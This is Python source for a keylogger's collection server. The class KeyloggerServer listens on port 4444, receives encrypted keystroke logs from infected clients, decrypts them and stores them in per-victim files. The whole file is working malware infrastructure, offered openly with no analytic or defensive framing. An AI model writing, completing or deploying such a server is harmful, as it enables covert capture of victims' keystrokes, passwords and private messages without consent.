import socket
import threading
import logging
from datetime import datetime
from pathlib import Path
from .decryptor import LogDecryptor

class KeyloggerServer:
    def __init__(self, host: str = '0.0.0.0', port: int = 4444):
        self.host = host
        self.port = port
        self.running = False
        self.log_dir = Path('collected_logs')
        self._setup_logging()
        self.decryptor = LogDecryptor(self._load_encryption_key())

    def _setup_logging(self):
        """Configure logging system"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('server')

    def _load_encryption_key(self) -> str:
        """Load encryption key from secure location"""
        key_file = Path('config/encryption.key')
        if not key_file.exists():
            raise FileNotFoundError("Encryption key not found")
        return key_file.read_text().strip()

    def _handle_client(self, conn: socket.socket, addr: tuple):
        """Process individual client connection"""
        client_ip = addr[0]
        try:
            self.logger.info(f"New connection from {client_ip}")
            
            # Create client-specific log file
            log_file = self.log_dir / f"{client_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            log_file.parent.mkdir(exist_ok=True)
            
            with log_file.open('ab') as f:
                while self.running:
                    # Read message length (4 bytes)
                    msg_len = conn.recv(4)
                    if not msg_len:
                        break
                    
                    # Convert to int
                    msg_len = int.from_bytes(msg_len, byteorder='big')
                    
                    # Read encrypted data
                    encrypted_data = conn.recv(msg_len)
                    if not encrypted_data:
                        break
                    
                    try:
                        # Decrypt and save log
                        decrypted = self.decryptor.decrypt_log(encrypted_data)
                        timestamp = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
                        f.write(f"{timestamp} {decrypted}\n".encode())
                        f.flush()
                    except Exception as e:
                        self.logger.error(f"Failed to process data from {client_ip}: {str(e)}")
                        continue
            
        except Exception as e:
            self.logger.error(f"Client {client_ip} error: {str(e)}")
        finally:
            conn.close()
            self.logger.info(f"Connection closed: {client_ip}")

    def start(self):
        """Start the server in listening mode"""
        self.running = True
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(5)
            
            self.logger.info(f"Server started on {self.host}:{self.port}")
            try:
                while self.running:
                    conn, addr = s.accept()
                    thread = threading.Thread(
                        target=self._handle_client,
                        args=(conn, addr),
                        daemon=True
                    )
                    thread.start()
            except KeyboardInterrupt:
                self.logger.info("Shutting down server...")
            finally:
                self.running = False

if __name__ == "__main__":
    server = KeyloggerServer()
    server.start()
